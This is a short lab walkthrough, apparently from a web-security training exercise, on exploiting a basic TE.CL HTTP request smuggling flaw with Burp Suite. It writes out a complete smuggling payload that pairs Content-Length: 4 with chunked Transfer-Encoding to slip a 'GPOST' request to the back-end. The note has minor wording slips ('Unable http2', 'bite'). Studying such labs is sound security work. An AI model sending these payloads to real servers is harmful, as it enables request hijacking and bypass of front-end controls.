# **HTTP request smuggling, basic TE.CL vulnerability**

Task: smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`  
Toolkit: BurpSuite, Browser

1. check site map and send to repeater  
2. change request method  
3. Unable http2 and auto content-length  
4. send normal request —-\> 200 response  
5. add  
   Content-length: 4  
   Transfer-Encoding: chunked  
     
   56  
   GPOST / HTTP/1.1  
   Content-Type: application/x-www-form-urlencoded  
   Content-Length: 6  
     
   0  
     
   \_\_\_\_\_\_\_\_\_\_  
   response 200 (content length 6 means that backend server wants to see an extra bite)

6. send normal request
